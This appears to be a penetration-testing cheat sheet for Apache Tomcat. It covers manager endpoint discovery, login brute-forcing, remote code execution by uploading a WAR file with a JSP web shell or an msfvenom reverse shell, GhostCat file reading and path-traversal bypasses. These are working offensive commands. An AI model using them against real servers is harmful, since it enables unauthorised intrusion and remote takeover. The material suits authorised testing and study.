
## Fingerprinting

Check for `/manager` and `/host-manager` endpoints, if got access then we have RCE.
Request for an `/invalid` endpoint or read `/docs` to check the service and version.

`scanner/http/tomcat_mgr_login` can be used on `msfconsole` for Login Brute-Forcing.
We can also use [this](https://github.com/b33lz3bub-1/Tomcat-Manager-Bruteforce) Python script for the same.

``` Nte
We might need to `set PROXIES http://127.0.0.1:8080` and edit the requests sent by the module with BurpSuite if received errors in msfconsole
```

## RCE - WAR File Upload

Requires `manager-gui` credentials. Metasploit: `multi/http/tomcat_mgr_upload`

### Manual: 

1. Download [JSP Web Shell](https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp) and add the web shell to a WAR archive: 
2. `zip -r backup.war cmd.jsp`
3. Or use `msfvenom` to generate a shell
4. `msfvenom -p java/jsp_shell_reverse_tcp LHOST=<your-ip> LPORT=<your-nc-port> -f war > backup.war`
5. Navigate to `/manager/html` and upload WAR File.
6. Get RCE: `curl http://test.example:8080/backup/cmd.jsp?cmd=id`

## CVE-2020-1938 - GhostCat

All Tomcat versions before 9.0.31, 8.5.51, and 7.0.100 were found vulnerable.
Only works if the `port 8009` is running the `AJP` service and allows to read files and folders within the `webapps` folder i.e. Unauthenticated LFI.

## Path Traversal via misconfigured Reverse Proxy

In some vulnerable configurations of Tomcat you can gain access to protected directories in Tomcat using the path: `/..;/` or `/;param=value/`

We might be able to access the Tomcat manager page by navigating to
`www.example.com/blabla/..;/manager/html`

Another way to bypass protected paths using this trick is to access
`www.example.com/;param=value/manager/html`

```Note
By default the Host Manager is only accessible from a browser running on the same machine as Tomcat. If you wish to modify this restriction, you'll need to edit the Host Manager's context.xml file.
```
